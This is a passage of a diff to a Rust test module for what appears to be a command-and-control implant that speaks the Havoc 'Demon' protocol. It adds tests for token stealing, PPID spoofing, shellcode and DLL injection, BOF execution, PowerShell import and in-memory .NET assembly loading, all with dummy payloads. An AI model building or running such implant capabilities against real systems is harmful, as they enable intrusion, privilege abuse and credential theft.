-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -5122,9 +5699,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let args = 42u32.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::Remove, &args);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -5153,9 +5736,15 @@ mod tests {
 
         let args = id.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::Remove, &args);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -5183,9 +5772,15 @@ mod tests {
         });
 
         let package = token_package(DemonTokenCommand::Clear, &[]);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -5202,9 +5797,15 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::new();
         let package = token_package(DemonTokenCommand::FindTokens, &[]);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -5224,9 +5825,15 @@ mod tests {
         // list_privs = 1 (list mode)
         let args = 1u32.to_le_bytes().to_vec();
         let package = token_package(DemonTokenCommand::PrivsGetOrList, &args);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         let mut off = 0;
@@ -5249,8 +5856,15 @@ mod tests {
         args.extend_from_slice(&0u32.to_le_bytes()); // handle = 0
         let package = token_package(DemonTokenCommand::Steal, &args);
         // On non-Windows stubs, steal returns Err → DispatchResult::Ignore.
-        let result =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Ignore));
     }
 
@@ -5280,9 +5894,15 @@ mod tests {
         args.extend_from_slice(&9u32.to_le_bytes()); // LOGON32_LOGON_NEW_CREDENTIALS
 
         let package = token_package(DemonTokenCommand::Make, &args);
-        let DispatchResult::Respond(resp) =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new())
-        else {
+        let DispatchResult::Respond(resp) = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        ) else {
             panic!("expected Respond");
         };
         // On non-Windows: make_token fails, so response has subcmd but no domain_user.
@@ -5304,7 +5924,15 @@ mod tests {
         let payload = 255u32.to_le_bytes().to_vec();
         let package = DemonPackage::new(DemonCommand::CommandToken, 1, payload);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new()),
+            dispatch(
+                &package,
+                &mut config,
+                &mut vault,
+                &mut downloads,
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new()
+            ),
             DispatchResult::Ignore
         ));
     }
@@ -5316,7 +5944,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let package = DemonPackage::new(DemonCommand::CommandToken, 1, vec![]);
         assert!(matches!(
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new()),
+            dispatch(
+                &package,
+                &mut config,
+                &mut vault,
+                &mut downloads,
+                &mut HashMap::new(),
+                &mut JobStore::new(),
+                &mut Vec::new()
+            ),
             DispatchResult::Ignore
         ));
     }
@@ -5721,7 +6357,15 @@ mod tests {
 
         let payload = memfile_payload(1, 5, &[1, 2, 3, 4, 5]);
         let package = DemonPackage::new(DemonCommand::CommandMemFile, 1, payload);
-        let result = dispatch(&package, &mut config, &mut vault, &mut downloads, &mut mem_files);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Respond(_)));
         assert!(mem_files.contains_key(&1));
     }
@@ -5735,8 +6379,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let payload = transfer_payload(0, &[]); // Transfer::List
         let package = DemonPackage::new(DemonCommand::CommandTransfer, 1, payload);
-        let result =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
 
@@ -5858,8 +6509,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let payload = ppid_spoof_payload(5678);
         let package = DemonPackage::new(DemonCommand::CommandProcPpidSpoof, 1, payload);
-        let result =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Respond(_)));
         assert_eq!(config.ppid_spoof, Some(5678));
     }
@@ -5916,8 +6574,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let payload = inject_shellcode_inject_payload(0, 1, &[0x90], &[], 1234);
         let package = DemonPackage::new(DemonCommand::CommandInjectShellcode, 1, payload);
-        let result =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
 
@@ -5960,8 +6625,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let payload = inject_dll_payload(0, 999, &[0xCC], &[0x4D, 0x5A], b"arg");
         let package = DemonPackage::new(DemonCommand::CommandInjectDll, 1, payload);
-        let result =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
 
@@ -6004,8 +6676,15 @@ mod tests {
         let mut downloads = DownloadTracker::new();
         let payload = spawn_dll_payload(&[0xAA], &[0xBB], b"args");
         let package = DemonPackage::new(DemonCommand::CommandSpawnDll, 1, payload);
-        let result =
-            dispatch(&package, &mut config, &mut vault, &mut downloads, &mut HashMap::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         assert!(matches!(result, DispatchResult::Respond(_)));
     }
 
@@ -6064,7 +6743,15 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::default();
         let mut mem_files = MemFileStore::new();
-        let result = dispatch(&pkg, &mut config, &mut vault, &mut downloads, &mut mem_files);
+        let result = dispatch(
+            &pkg,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         // On non-Windows, get_luid returns error → success=FALSE.
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
@@ -6483,7 +7170,15 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::default();
         let mut mem_files = MemFileStore::new();
-        let result = dispatch(&pkg, &mut config, &mut vault, &mut downloads, &mut mem_files);
+        let result = dispatch(
+            &pkg,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
 
         assert!(config.verbose);
         let DispatchResult::Respond(resp) = result else { panic!("expected Respond") };
@@ -6542,10 +7237,357 @@ mod tests {
         let mut vault = TokenVault::new();
         let mut downloads = DownloadTracker::default();
         let mut mem_files = MemFileStore::new();
-        let result = dispatch(&pkg, &mut config, &mut vault, &mut downloads, &mut mem_files);
+        let result = dispatch(
+            &pkg,
+            &mut config,
+            &mut vault,
+            &mut downloads,
+            &mut mem_files,
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
         let DispatchResult::Respond(resp) = result else {
             panic!("expected Respond");
         };
         assert_eq!(resp.command_id, u32::from(DemonCommand::CommandScreenshot));
+    }
+
+    // ── CommandInlineExecute (20) ───────────────────────────────────────────
+
+    #[test]
+    fn inline_execute_short_payload_returns_could_not_run() {
+        let result = handle_inline_execute(&[], &SpecterConfig::default(), &mut HashMap::new());
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
+        // Payload should start with BOF_COULD_NOT_RUN (4)
+        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
+    }
+
+    #[test]
+    fn inline_execute_missing_memfile_returns_could_not_run() {
+        // Valid payload structure but memfile IDs don't exist
+        let mut payload = Vec::new();
+        // function_name: "go"
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        // bof_file_id
+        payload.extend_from_slice(&99u32.to_le_bytes());
+        // params_file_id
+        payload.extend_from_slice(&100u32.to_le_bytes());
+        // flags
+        payload.extend_from_slice(&0u32.to_le_bytes());
+
+        let result =
+            handle_inline_execute(&payload, &SpecterConfig::default(), &mut HashMap::new());
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
+        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
+    }
+
+    #[test]
+    fn inline_execute_incomplete_memfile_returns_could_not_run() {
+        let mut mem_files = MemFileStore::new();
+        // Insert an incomplete memfile
+        mem_files.insert(1, MemFile { expected_size: 100, data: vec![0u8; 50] });
+
+        let mut payload = Vec::new();
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        payload.extend_from_slice(&1u32.to_le_bytes()); // bof_file_id
+        payload.extend_from_slice(&2u32.to_le_bytes()); // params_file_id
+        payload.extend_from_slice(&0u32.to_le_bytes()); // flags
+
+        let result = handle_inline_execute(&payload, &SpecterConfig::default(), &mut mem_files);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let cb_type = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(cb_type, coffeeldr::BOF_COULD_NOT_RUN);
+        // Memfiles should be cleaned up
+        assert!(!mem_files.contains_key(&1));
+    }
+
+    #[test]
+    fn inline_execute_with_valid_memfiles_attempts_execution() {
+        let mut mem_files = MemFileStore::new();
+        // Insert complete memfiles (garbage COFF data — execution will fail)
+        mem_files.insert(1, MemFile { expected_size: 4, data: vec![0xDE, 0xAD, 0xBE, 0xEF] });
+        mem_files.insert(2, MemFile { expected_size: 0, data: Vec::new() });
+
+        let mut payload = Vec::new();
+        let func = b"go\0";
+        payload.extend_from_slice(&(func.len() as u32).to_le_bytes());
+        payload.extend_from_slice(func);
+        payload.extend_from_slice(&1u32.to_le_bytes());
+        payload.extend_from_slice(&2u32.to_le_bytes());
+        payload.extend_from_slice(&0u32.to_le_bytes());
+
+        let result = handle_inline_execute(&payload, &SpecterConfig::default(), &mut mem_files);
+        // Should get some kind of response (BOF_COULD_NOT_RUN on invalid COFF)
+        match result {
+            DispatchResult::Respond(resp) => {
+                assert_eq!(resp.command_id, u32::from(DemonCommand::CommandInlineExecute));
+            }
+            DispatchResult::MultiRespond(resps) => {
+                assert!(!resps.is_empty());
+                assert_eq!(resps[0].command_id, u32::from(DemonCommand::CommandInlineExecute));
+            }
+            _ => panic!("expected Respond or MultiRespond"),
+        }
+        // Memfiles should be cleaned up
+        assert!(!mem_files.contains_key(&1));
+        assert!(!mem_files.contains_key(&2));
+    }
+
+    // ── CommandJob (21) ─────────────────────────────────────────────────────
+
+    #[test]
+    fn job_list_empty_store_returns_header_only() {
+        let mut store = JobStore::new();
+        let payload = 1u32.to_le_bytes().to_vec(); // List = 1
+        let result = handle_job(&payload, &mut store);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandJob));
+        // Payload: [1: u32 LE] — just the subcommand, no jobs
+        assert_eq!(resp.payload.len(), 4);
+        let subcmd = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(subcmd, 1);
+    }
+
+    #[test]
+    fn job_list_with_jobs_includes_all_entries() {
+        let mut store = JobStore::new();
+        store.add(crate::job::JOB_TYPE_THREAD, 0);
+        store.add(crate::job::JOB_TYPE_PROCESS, 0);
+
+        let payload = 1u32.to_le_bytes().to_vec();
+        let result = handle_job(&payload, &mut store);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        // Payload: [1: u32] + 2 * [job_id: u32, type: u32, state: u32] = 4 + 24 = 28
+        assert_eq!(resp.payload.len(), 28);
+    }
+
+    #[test]
+    fn job_suspend_nonexistent_returns_failure() {
+        let mut store = JobStore::new();
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&2u32.to_le_bytes()); // Suspend = 2
+        payload.extend_from_slice(&999u32.to_le_bytes()); // nonexistent job
+        let result = handle_job(&payload, &mut store);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        // [2: u32][999: u32][0: u32 (false)]
+        assert_eq!(resp.payload.len(), 12);
+        let success = u32::from_le_bytes(resp.payload[8..12].try_into().expect("u32"));
+        assert_eq!(success, 0);
+    }
+
+    #[test]
+    fn job_kill_existing_returns_success() {
+        let mut store = JobStore::new();
+        let id = store.add(crate::job::JOB_TYPE_THREAD, 0);
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&4u32.to_le_bytes()); // KillRemove = 4
+        payload.extend_from_slice(&id.to_le_bytes());
+        let result = handle_job(&payload, &mut store);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let success = u32::from_le_bytes(resp.payload[8..12].try_into().expect("u32"));
+        assert_eq!(success, 1);
+    }
+
+    #[test]
+    fn job_unknown_subcommand_returns_ignore() {
+        let mut store = JobStore::new();
+        let payload = 99u32.to_le_bytes().to_vec();
+        let result = handle_job(&payload, &mut store);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    #[test]
+    fn job_short_payload_returns_ignore() {
+        let mut store = JobStore::new();
+        let result = handle_job(&[0x01], &mut store);
+        assert!(matches!(result, DispatchResult::Ignore));
+    }
+
+    // ── CommandPsImport (0x1011) ────────────────────────────────────────────
+
+    #[test]
+    fn ps_import_stores_script_and_responds_success() {
+        let mut ps_scripts = PsScriptStore::new();
+        let mut mem_files = MemFileStore::new();
+
+        // Stage script in memfile
+        let script = b"Write-Host 'Hello'";
+        mem_files.insert(42, MemFile { expected_size: script.len(), data: script.to_vec() });
+
+        let payload = 42u32.to_le_bytes().to_vec(); // memfile ID
+        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPsImport));
+        assert_eq!(ps_scripts, script.to_vec());
+        // Response should contain empty string (success)
+        let out_len = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(out_len, 0);
+    }
+
+    #[test]
+    fn ps_import_missing_memfile_uses_raw_payload() {
+        let mut ps_scripts = PsScriptStore::new();
+        let mut mem_files = MemFileStore::new();
+
+        // Payload: [memfile_id: u32][raw script bytes]
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&99u32.to_le_bytes()); // nonexistent memfile
+        payload.extend_from_slice(b"Get-Process");
+
+        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandPsImport));
+        assert_eq!(ps_scripts, b"Get-Process".to_vec());
+    }
+
+    #[test]
+    fn ps_import_empty_script_returns_error() {
+        let mut ps_scripts = PsScriptStore::new();
+        let mut mem_files = MemFileStore::new();
+        mem_files.insert(1, MemFile { expected_size: 0, data: Vec::new() });
+
+        let payload = 1u32.to_le_bytes().to_vec();
+        let result = handle_ps_import(&payload, &mut ps_scripts, &mut mem_files);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        // Should contain non-empty error message
+        let out_len = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert!(out_len > 0);
+    }
+
+    // ── CommandAssemblyInlineExecute (0x2001) ───────────────────────────────
+
+    #[test]
+    fn assembly_inline_execute_short_payload_returns_failed() {
+        let result = handle_assembly_inline_execute(&[], &mut HashMap::new());
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyInlineExecute));
+        let info_id = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(info_id, dotnet::DOTNET_INFO_FAILED);
+    }
+
+    #[test]
+    fn assembly_inline_execute_missing_memfile_returns_failed() {
+        let mut mem_files = MemFileStore::new();
+
+        // Build payload with valid wstrings but nonexistent memfile
+        let mut payload = Vec::new();
+        // pipe_name
+        let pipe_utf16: Vec<u8> = "pipe"
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        payload.extend_from_slice(&(pipe_utf16.len() as u32).to_le_bytes());
+        payload.extend_from_slice(&pipe_utf16);
+        // app_domain
+        let domain_utf16: Vec<u8> = "dom"
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        payload.extend_from_slice(&(domain_utf16.len() as u32).to_le_bytes());
+        payload.extend_from_slice(&domain_utf16);
+        // net_version
+        let ver_utf16: Vec<u8> = "v4.0"
+            .encode_utf16()
+            .chain(std::iter::once(0u16))
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        payload.extend_from_slice(&(ver_utf16.len() as u32).to_le_bytes());
+        payload.extend_from_slice(&ver_utf16);
+        // memfile_id (nonexistent)
+        payload.extend_from_slice(&999u32.to_le_bytes());
+
+        let result = handle_assembly_inline_execute(&payload, &mut mem_files);
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        let info_id = u32::from_le_bytes(resp.payload[0..4].try_into().expect("u32"));
+        assert_eq!(info_id, dotnet::DOTNET_INFO_FAILED);
+    }
+
+    // ── CommandAssemblyListVersions (0x2003) ────────────────────────────────
+
+    #[test]
+    fn assembly_list_versions_returns_respond() {
+        let result = handle_assembly_list_versions();
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
+        // On non-Windows, payload will be empty (no CLR versions)
+        #[cfg(not(windows))]
+        assert_eq!(resp.payload.len(), 0);
+    }
+
+    // ── Full dispatch routing tests for new commands ────────────────────────
+
+    #[test]
+    fn dispatch_routes_command_job() {
+        let mut config = SpecterConfig::default();
+        let payload = 1u32.to_le_bytes().to_vec(); // List
+        let package = DemonPackage::new(DemonCommand::CommandJob, 1, payload);
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandJob));
+    }
+
+    #[test]
+    fn dispatch_routes_command_assembly_list_versions() {
+        let mut config = SpecterConfig::default();
+        let package = DemonPackage::new(DemonCommand::CommandAssemblyListVersions, 1, Vec::new());
+        let result = dispatch(
+            &package,
+            &mut config,
+            &mut TokenVault::new(),
+            &mut DownloadTracker::new(),
+            &mut HashMap::new(),
+            &mut JobStore::new(),
+            &mut Vec::new(),
+        );
+        let DispatchResult::Respond(resp) = result else {
+            panic!("expected Respond");
+        };
+        assert_eq!(resp.command_id, u32::from(DemonCommand::CommandAssemblyListVersions));
     }
 }
